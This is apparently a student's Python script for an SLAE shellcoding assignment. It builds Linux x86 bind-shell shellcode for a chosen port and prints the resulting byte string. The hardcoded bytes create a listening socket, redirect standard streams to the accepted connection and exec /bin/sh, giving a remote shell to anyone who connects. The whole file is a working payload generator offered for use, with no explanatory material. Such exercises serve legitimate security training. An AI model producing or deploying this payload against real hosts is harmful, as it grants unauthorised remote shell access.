#!/usr/bin/python3.5
# Ben Chase
# Student ID SLAE - 860
# Assignment 1

import argparse
from struct import pack

begin = r"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x31\xff\x97\x6a\x66\x58\x6a\x02\x5b" \
        r"\x31\xc9\x51\x66\x68"

end = r"\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x31\xc9\x51\x57\x89\xe1\xcd\x80\xb0\x66" \
      r"\xb3\x05\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xc9" \
      r"\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80"

parser = argparse.ArgumentParser()
parser.add_argument('-p', action="store", dest="p", type=int)
args = parser.parse_args()

if args.p > 1024 and args.p < 65536:
        # This is a little ugly, but it appears to work for this purpose
        unformatted_port = r''.join(hex(b)[2:4] for b in pack('!i', args.p))
        delim = r'\x'
        port = delim + unformatted_port[2:4] + delim + unformatted_port[4:8]
        shellcode = begin + port + end
        print("Shellcode :  " + "\"" + shellcode + "\";")
else:
        print('Port must be between 1025 and 65535. Exiting.')
